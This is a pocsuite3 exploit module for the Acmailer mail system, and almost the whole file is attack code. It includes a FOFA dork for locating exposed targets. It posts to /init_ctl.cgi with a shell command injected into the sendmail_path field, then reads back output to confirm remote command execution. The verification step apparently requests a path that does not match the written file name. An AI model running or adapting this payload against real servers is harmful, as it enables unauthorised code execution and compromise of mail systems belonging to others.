from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
import re
from urllib.parse import urljoin
minimum_version_required('2.0.5')

class EXP(POCBase):
    name = "Acmailer邮件系统"
    dork = {'fofa': 'body="CGI acmailer"'}
    def _exploit(self):
        ran_str = random_str(5)
        vulUrl = self.url + '/init_ctl.cgi'
        tarUrl = self.url + ran_str
        header = {
            "Content-Type":"application/x-www-form-urlencoded",
            "Accept-Encoding":"gzip",
            "User-Agent":"Mozilla/5.0",
            "Connection":"close",
            "Content-Length":"150"
        }
        data = f"admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|id >{ran_str}.txt | bash&homeurl=http://&mypath=e"
        res = requests.post(vulUrl,headers=header,data=data,verify=False,timeout=5)
        if res.status_code == 302:
            res1 = requests.get(tarUrl,verify=False,timeout=5)
            if "uid=" in res1.text:
                return res1.text
    def _verify(self):
        result = {}
        res = self._exploit()
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']["URL"] = self.url
        return self.parse_output(result)

register_poc(EXP)